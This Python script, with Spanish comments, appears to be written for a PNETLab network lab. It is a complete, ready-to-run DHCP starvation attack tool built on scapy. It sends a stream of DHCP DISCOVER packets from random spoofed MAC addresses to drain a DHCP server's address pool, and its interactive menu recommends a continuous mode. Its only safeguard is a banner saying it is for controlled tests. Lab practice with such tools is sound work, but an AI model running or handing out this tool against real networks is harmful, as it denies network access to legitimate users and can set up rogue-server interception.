#!/usr/bin/env python3
"""
DHCP Starvation Tool - Solo para entornos de prueba controlados
Autor: Script para PNETLab
"""

from scapy.all import *
import random
import sys
import time

def generar_mac():
    """Genera una dirección MAC aleatoria"""
    return ":".join(["{:02x}".format(random.randint(0, 255)) for _ in range(6)])

def crear_dhcp_discover(mac_origen, iface):
    """Crea un paquete DHCP DISCOVER"""
    pkt = (Ether(src=mac_origen, dst="ff:ff:ff:ff:ff:ff") /
           IP(src="0.0.0.0", dst="255.255.255.255") /
           UDP(sport=68, dport=67) /
           BOOTP(chaddr=mac_origen, xid=random.randint(1, 0xFFFFFFFF)) /
           DHCP(options=[("message-type", "discover"), "end"]))
    return pkt

def dhcp_starvation(interfaz, cantidad, intervalo, modo_continuo=False):
    """Ejecuta el ataque DHCP starvation"""
    print(f"\n[*] Iniciando DHCP Starvation en interfaz: {interfaz}")
    if modo_continuo:
        print(f"[*] Modo: CONTINUO - hasta agotar el pool")
    else:
        print(f"[*] Cantidad de solicitudes: {cantidad}")
    print(f"[*] Intervalo entre paquetes: {intervalo}s\n")
    
    contador = 0
    try:
        while True:
            mac_falsa = generar_mac()
            paquete = crear_dhcp_discover(mac_falsa, interfaz)
            
            sendp(paquete, iface=interfaz, verbose=0)
            
            contador += 1
            if modo_continuo:
                print(f"[{contador}] DISCOVER enviado desde MAC: {mac_falsa}")
            else:
                print(f"[{contador}/{cantidad}] DISCOVER enviado desde MAC: {mac_falsa}")
            
            if intervalo > 0:
                time.sleep(intervalo)
            
            # Si no es modo continuo y alcanzamos la cantidad, salir
            if not modo_continuo and contador >= cantidad:
                break
                
    except KeyboardInterrupt:
        print(f"\n[!] Ataque interrumpido por el usuario. Total enviados: {contador}")
    except Exception as e:
        print(f"\n[!] Error: {e}")

def mostrar_banner():
    """Muestra el banner del script"""
    print("="*60)
    print("    DHCP STARVATION TOOL - SOLO PARA PRUEBAS CONTROLADAS")
    print("="*60)

def menu_principal():
    """Menú interactivo principal"""
    mostrar_banner()
    
    # Mostrar interfaces disponibles
    print("\n[*] Interfaces disponibles:")
    interfaces = get_if_list()
    for idx, iface in enumerate(interfaces, 1):
        print(f"  {idx}. {iface}")
    
    # Selección de interfaz
    while True:
        try:
            seleccion = input("\n[?] Selecciona la interfaz (número): ")
            idx_interfaz = int(seleccion) - 1
            if 0 <= idx_interfaz < len(interfaces):
                interfaz = interfaces[idx_interfaz]
                break
            else:
                print("[!] Número inválido. Intenta de nuevo.")
        except ValueError:
            print("[!] Entrada inválida. Ingresa un número.")
    
    # Modo de ataque
    print("\n[*] Modos de ataque:")
    print("  1. Cantidad específica de solicitudes")
    print("  2. MODO CONTINUO - Agotar todo el pool (recomendado)")
    
    while True:
        try:
            modo = input("\n[?] Selecciona el modo (1 o 2): ")
            if modo in ['1', '2']:
                modo_continuo = (modo == '2')
                break
            else:
                print("[!] Opción inválida. Ingresa 1 o 2.")
        except ValueError:
            print("[!] Entrada inválida.")
    
    # Cantidad de solicitudes (solo si no es continuo)
    if not modo_continuo:
        while True:
            try:
                cantidad = int(input("[?] Cantidad de solicitudes DHCP DISCOVER: "))
                if cantidad > 0:
                    break
                else:
                    print("[!] Debe ser mayor a 0.")
            except ValueError:
                print("[!] Entrada inválida. Ingresa un número.")
    else:
        cantidad = 0
        print("[*] Modo continuo activado - enviará paquetes indefinidamente")
        print("[*] Presiona Ctrl+C para detener cuando se agote el pool")
    
    # Intervalo entre paquetes
    while True:
        try:
            intervalo = float(input("[?] Intervalo entre paquetes en segundos (0.01 recomendado): "))
            if intervalo >= 0:
                break
            else:
                print("[!] Debe ser mayor o igual a 0.")
        except ValueError:
            print("[!] Entrada inválida. Ingresa un número.")
    
    # Confirmación
    print("\n" + "="*60)
    print("[!] CONFIRMACIÓN:")
    print(f"  - Interfaz: {interfaz}")
    if modo_continuo:
        print(f"  - Modo: CONTINUO (hasta agotar pool)")
    else:
        print(f"  - Solicitudes: {cantidad}")
    print(f"  - Intervalo: {intervalo}s")
    print("="*60)
    
    confirmar = input("\n[?] ¿Proceder con el ataque? (s/n): ").lower()
    
    if confirmar == 's':
        dhcp_starvation(interfaz, cantidad, intervalo, modo_continuo)
        print("\n[✓] Ataque completado.")
    else:
        print("\n[!] Ataque cancelado.")

if __name__ == "__main__":
    # Verificar privilegios de root
    if os.geteuid() != 0:
        print("[!] Este script requiere privilegios de root.")
        print("[!] Ejecuta con: sudo python3 dhcp_starvation.py")
        sys.exit(1)
    
    try:
        menu_principal()
    except KeyboardInterrupt:
        print("\n\n[!] Script terminado por el usuario.")
        sys.exit(0)
